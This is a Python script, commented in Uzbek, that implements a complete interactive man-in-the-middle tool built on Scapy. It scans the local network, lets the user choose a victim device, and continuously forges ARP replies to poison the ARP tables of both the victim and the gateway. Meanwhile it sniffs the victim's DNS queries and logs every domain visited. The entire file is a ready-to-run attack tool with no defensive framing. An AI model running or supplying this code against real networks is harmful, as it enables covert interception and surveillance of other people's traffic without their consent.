#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
Professional ARP Spoofing va DNS Sniffer dasturi
Python va Scapy yordamida

Xususiyatlari:
- Tarmoqni skanerlash (ARP)
- Nishon qurilmani interaktiv tanlash
- ARP Spoofing (Man-in-the-Middle)
- DNS Sniffing
- Xatolik boshqarish va ARP restore
"""

import sys
import signal
import threading
import json
import os
from datetime import datetime
from scapy.all import (
    ARP, Ether, ICMP, IP, UDP, DNS, DNSQR,
    conf, get_if_hwaddr, get_if_addr,
    srp, sendp, sniff
)
import subprocess
import platform

# Scapy ning verbose va warning xabarlari o'chiring
conf.verb = 0

class ARPSpoofingDNSSniffer:
    """ARP Spoofing va DNS Sniffing uchun asosiy sinf"""
    
    def __init__(self):
        self.target_ip = None
        self.gateway_ip = None
        self.target_mac = None
        self.gateway_mac = None
        self.interface = None
        self.our_mac = None
        self.running = False
        self.original_arp_table = {}
        self.dns_cache = {}
        self.packets_sent = 0
        self.packets_sniffed = 0
        
    def get_local_ip(self):
        """Mahalliy IP manzilini aniqlang"""
        try:
            # Gateway IP ni aniqlash
            if platform.system() == "Windows":
                result = subprocess.run(["ipconfig"], capture_output=True, text=True)
                for line in result.stdout.split('\n'):
                    if "Standart Shlyuz" in line or "Default Gateway" in line:
                        gateway = line.split(':')[-1].strip()
                        if gateway:
                            return gateway
            else:
                result = subprocess.run(["ip", "route"], capture_output=True, text=True)
                for line in result.stdout.split('\n'):
                    if "default via" in line:
                        return line.split()[2]
        except:
            pass
        return "192.168.1.1"
    
    def get_interfaces_list(self):
        """Tarmoq interfeyslarini olish"""
        interfaces = []
        
        try:
            # Linux/macOS da interfeys topish
            if platform.system() in ["Linux", "Darwin"]:
                try:
                    result = subprocess.run(
                        ["ip", "link", "show"],
                        capture_output=True, text=True, timeout=2
                    )
                    for line in result.stdout.split('\n'):
                        if ':' in line and not line.startswith(' '):
                            iface = line.split(':')[1].strip()
                            if iface not in ['lo', 'docker0', 'veth']:
                                interfaces.append(iface)
                except:
                    # Agar ip mavjud bo'lmasa, ifconfig ishlatish
                    try:
                        result = subprocess.run(
                            ["ifconfig"],
                            capture_output=True, text=True, timeout=2
                        )
                        for line in result.stdout.split('\n'):
                            if line and not line.startswith(' ') and not line.startswith('\t'):
                                iface = line.split(':')[0].strip()
                                if iface not in ['lo', 'docker0'] and iface:
                                    if iface not in interfaces:
                                        interfaces.append(iface)
                    except:
                        pass
            else:
                # Windows da interfeys topish
                try:
                    result = subprocess.run(
                        ["ipconfig"],
                        capture_output=True, text=True, timeout=2
                    )
                    for line in result.stdout.split('\n'):
                        if 'Ethernet adapter' in line or 'Wireless' in line or 'WiFi' in line:
                            iface = line.split(':')[0].strip()
                            if 'adapter' in iface.lower():
                                iface = iface.replace('Ethernet adapter', '').replace('Wireless LAN adapter', '').replace('WiFi', '').strip()
                                if iface:
                                    interfaces.append(iface)
                except:
                    pass
        except Exception as e:
            print(f"⚠️  Interfeys topishda xato: {e}")
        
        # Dublikat'larni yo'q qilish
        interfaces = list(dict.fromkeys(interfaces))
        return interfaces
    
    def select_interface(self):
        """Tarmoq interfeysini tanlang yoki avtomatik aniqlang"""
        print("\n" + "="*60)
        print("🔧 TARMOQ INTERFEYSINI TANLANG")
        print("="*60)
        
        interfaces = self.get_interfaces_list()
        
        if not interfaces:
            print("\n⚠️  Avtomatik interfeyslari topilmadi!")
            print("\nQo'lda interfeys nomini kiriting:")
            manual_interface = input("🖱️  Interfeys nomi (masalan: wlan0, eth0, WiFi): ").strip()
            if manual_interface:
                try:
                    self.interface = manual_interface
                    self.our_mac = get_if_hwaddr(self.interface)
                    print(f"\n✅ Tanlangan interfeys: {self.interface}")
                    print(f"   MAC manzili: {self.our_mac}")
                    return True
                except Exception as e:
                    print(f"❌ Interfeys '{manual_interface}' topilmadi: {e}")
                    return False
            else:
                return False
        
        print("\n📋 Mavjud interfeyslar:")
        for idx, iface in enumerate(interfaces, 1):
            print(f"  {idx}. {iface}")
        
        choice = input("\n🖱️  Raqamni tanlang (1-{}): ".format(len(interfaces))).strip()
        
        try:
            idx = int(choice) - 1
            if 0 <= idx < len(interfaces):
                self.interface = interfaces[idx]
                try:
                    self.our_mac = get_if_hwaddr(self.interface)
                    print(f"\n✅ Tanlangan interfeys: {self.interface}")
                    print(f"   MAC manzili: {self.our_mac}")
                    return True
                except Exception as e:
                    print(f"❌ MAC topishda xato: {e}")
                    return False
        except (ValueError, IndexError):
            pass
        
        print("❌ Noto'g'ri tanlov!")
        return False
    
    def scan_network(self):
        """Tarmoq skanerlash - ARP broadcast"""
        print("\n" + "="*60)
        print("🔍 TARMOQ SKANERLASHI BOSHLANMOQDA")
        print("="*60)
        
        if not self.interface:
            print("❌ Interfeys tanlanmagan!")
            return False
        
        try:
            local_ip = get_if_addr(self.interface)
            network = ".".join(local_ip.split(".")[:3]) + ".0/24"
            
            print(f"\n📡 Skanerlanyotgan tarmoq: {network}")
            print(f"📍 Mahalliy IP: {local_ip}")
            print("🔄 Skanerlash davom etmoqda...\n")
            
            # ARP request yuborish
            arp_request = Ether(dst="ff:ff:ff:ff:ff:ff") / ARP(pdst=network)
            answered, unanswered = srp(
                arp_request,
                iface=self.interface,
                timeout=2,
                verbose=False
            )
            
            active_devices = []
            
            for sent, received in answered:
                client_ip = received.psrc
                client_mac = received.hwsrc
                
                if client_ip != local_ip:  # O'zimizni chiqarish
                    active_devices.append({
                        "ip": client_ip,
                        "mac": client_mac
                    })
                    print(f"✅ {client_ip:15} | {client_mac}")
            
            if not active_devices:
                print("⚠️  Biron bir qurilma topilmadi!")
                return False
            
            print(f"\n📊 Jami qurilmalar: {len(active_devices)}")
            return active_devices
            
        except PermissionError:
            print("❌ Ruxsat berilmadi! Administrator huquqida ishga tushiring (sudo).")
            sys.exit(1)
        except Exception as e:
            print(f"❌ Skanerlash xatosi: {e}")
            return False
    
    def get_mac(self, ip):
        """IP manzili bo'yicha MAC manzilni topish"""
        try:
            arp_request = Ether(dst="ff:ff:ff:ff:ff:ff") / ARP(pdst=ip)
            answered, _ = srp(
                arp_request,
                iface=self.interface,
                timeout=1,
                verbose=False
            )
            
            if answered:
                return answered[0][1].hwsrc
            return None
        except:
            return None
    
    def select_target(self, devices):
        """Nishon qurilmani tanlang"""
        print("\n" + "="*60)
        print("🎯 NISHON QURILMANI TANLANG")
        print("="*60)
        
        gateway_ip = self.get_local_ip()
        
        print(f"\n📍 Gateway IP: {gateway_ip}")
        print("\n📋 Mavjud qurilmalar:")
        
        for idx, device in enumerate(devices, 1):
            print(f"  {idx}. {device['ip']:15} | {device['mac']}")
        
        choice = input(f"\n🖱️  Raqamni tanlang (1-{len(devices)}): ").strip()
        
        try:
            idx = int(choice) - 1
            if 0 <= idx < len(devices):
                self.target_ip = devices[idx]["ip"]
                self.target_mac = devices[idx]["mac"]
                self.gateway_ip = gateway_ip
                self.gateway_mac = self.get_mac(gateway_ip)
                
                if not self.gateway_mac:
                    print(f"❌ Gateway MAC manzili topilmadi!")
                    return False
                
                print(f"\n✅ Nishon tanlandi:")
                print(f"   IP: {self.target_ip}")
                print(f"   MAC: {self.target_mac}")
                print(f"   Gateway IP: {self.gateway_ip}")
                print(f"   Gateway MAC: {self.gateway_mac}")
                
                return True
        except (ValueError, IndexError):
            pass
        
        print("❌ Noto'g'ri tanlov!")
        return False
    
    def spoof_arp(self, target_ip, spoof_ip):
        """ARP Spoofing paketini yuborish"""
        try:
            target_mac = self.get_mac(target_ip)
            if not target_mac:
                return
            
            # Nishon qurilmaning ARP jadvalini o'zgartirish
            packet = Ether(dst=target_mac) / ARP(
                op="is-at",
                pdst=target_ip,
                hwdst=target_mac,
                psrc=spoof_ip,
                hwsrc=self.our_mac
            )
            
            sendp(packet, iface=self.interface, verbose=False)
            self.packets_sent += 1
            
        except Exception as e:
            pass  # Xatoliklarni sho'p qilish
    
    def spoof_process(self):
        """ARP spoofing jarayoni"""
        print("\n🚀 ARP SPOOFING JARAYONI BOSHLANMOQDA")
        print("="*60)
        
        while self.running:
            try:
                # Target -> Gateway: Gateway MAC = Bizning MAC
                self.spoof_arp(self.target_ip, self.gateway_ip)
                
                # Gateway -> Target: Target MAC = Bizning MAC
                self.spoof_arp(self.gateway_ip, self.target_ip)
                
                threading.Event().wait(1)  # Har 1 soniyada takrorlash
                
            except KeyboardInterrupt:
                break
            except:
                pass
    
    def restore_arp(self):
        """ARP jadvallarini asl holiga qaytarish"""
        print("\n🔄 ARP JADVALLARINI QAYTARILMOQDA...")
        
        try:
            # Target ARP jadvalini restore
            restore_packet_target = Ether(dst=self.target_mac) / ARP(
                op="is-at",
                pdst=self.target_ip,
                hwdst=self.target_mac,
                psrc=self.gateway_ip,
                hwsrc=self.gateway_mac
            )
            
            # Gateway ARP jadvalini restore
            restore_packet_gateway = Ether(dst=self.gateway_mac) / ARP(
                op="is-at",
                pdst=self.gateway_ip,
                hwdst=self.gateway_mac,
                psrc=self.target_ip,
                hwsrc=self.target_mac
            )
            
            for _ in range(5):  # 5 marta yuborish
                try:
                    sendp(restore_packet_target, iface=self.interface, verbose=False)
                    sendp(restore_packet_gateway, iface=self.interface, verbose=False)
                    threading.Event().wait(0.1)
                except:
                    pass
            
            print("✅ ARP jadvallar qaytarildi!")
            
        except Exception as e:
            print(f"⚠️  Restore xatosi: {e}")
    
    def packet_callback(self, packet):
        """Paketni qayta ishlash (DNS sniffing)"""
        try:
            # Faqat nishon qurilmadan keladigan paketlarni ko'rish
            if packet[IP].src == self.target_ip:
                
                # DNS paketlarini tekshirish (UDP port 53)
                if packet.haslayer(UDP):
                    # Port tekshirish (53 = DNS)
                    if packet[UDP].dport == 53 or packet[UDP].sport == 53:
                        if packet.haslayer(DNS):
                            dns_layer = packet[DNS]
                            
                            # DNS so'rovini tekshirish (qr=0 = query)
                            if dns_layer.qr == 0:
                                try:
                                    # Barcha so'rovlarni o'tish
                                    if dns_layer.qdcount > 0:
                                        for question in dns_layer.questions:
                                            if hasattr(question, 'qname'):
                                                domain = question.qname.decode('utf-8', errors='ignore').rstrip('.')
                                                
                                                # Dublikat so'rovlarni chiqarish
                                                if domain and domain not in self.dns_cache:
                                                    self.dns_cache[domain] = True
                                                    timestamp = datetime.now().strftime("%H:%M:%S")
                                                    print(f"🌐 [{timestamp}] DNS so'rovi: {domain}")
                                                    self.packets_sniffed += 1
                                except:
                                    pass
        
        except Exception:
            pass  # Xatoliklarni sho'p qilish
    
    def sniff_process(self):
        """DNS sniffing jarayoni"""
        print("📊 DNS SNIFFING BOSHLANMOQDA")
        print("="*60)
        print("🌐 Nishon qurilmadan keladigan DNS so'rovlari:\n")
        
        try:
            # Nishon qurilmadan keladigan barcha UDP paketlarni tutish
            # Keyin packet_callback'da DNS so'rovlarini filtrlash
            sniff(
                iface=self.interface,
                prn=self.packet_callback,
                filter=f"ip src {self.target_ip} and udp",
                # udp port 53 o'rniga, hammasi yuborilib keyin filter qilamiz
                store=False,
                stop_filter=lambda x: not self.running
            )
        except Exception as e:
            print(f"⚠️  Sniffing xatosi: {e}")
    
    def signal_handler(self, sig, frame):
        """Ctrl+C signalini boshqarish"""
        print("\n\n⏹️  DASTUR TO'XTATILMOQDA...")
        self.running = False
        self.restore_arp()
        self.print_statistics()
        sys.exit(0)
    
    def print_statistics(self):
        """Statistikani chiqarish"""
        print("\n" + "="*60)
        print("📈 STATISTIKA")
        print("="*60)
        print(f"📤 Yuborilgan ARP paketlar: {self.packets_sent}")
        print(f"📥 Sniffer qilingan DNS so'rovlar: {self.packets_sniffed}")
        print(f"🌐 Har xil domenlar soni: {len(self.dns_cache)}")
        
        if self.dns_cache:
            print("\n🌐 Ziyarat qilingan domenlar:")
            for idx, domain in enumerate(sorted(self.dns_cache.keys()), 1):
                print(f"   {idx}. {domain}")
    
    def run(self):
        """Asosiy dastur"""
        print("\n" + "="*70)
        print("🛡️  PROFESSIONAL ARP SPOOFING VA DNS SNIFFER")
        print("="*70)
        
        # Signal handler o'rnatish
        signal.signal(signal.SIGINT, self.signal_handler)
        
        # Interfeys tanlash
        if not self.select_interface():
            sys.exit(1)
        
        # Tarmoq skanerlash
        devices = self.scan_network()
        if not devices:
            sys.exit(1)
        
        # Nishon tanlash
        if not self.select_target(devices):
            sys.exit(1)
        
        # Jarayonlarni ishga tushirish
        self.running = True
        
        spoof_thread = threading.Thread(target=self.spoof_process, daemon=True)
        sniff_thread = threading.Thread(target=self.sniff_process, daemon=True)
        
        spoof_thread.start()
        sniff_thread.start()
        
        try:
            spoof_thread.join()
            sniff_thread.join()
        except KeyboardInterrupt:
            self.signal_handler(None, None)


def main():
    """Asosiy funksiya"""
    # Root/Administrator huquqini tekshirish
    if platform.system() != "Windows":
        if os.geteuid() != 0:
            print("❌ Administrator huquqida ishga tushiring (sudo)!")
            sys.exit(1)
    
    sniffer = ARPSpoofingDNSSniffer()
    sniffer.run()


if __name__ == "__main__":
    main()
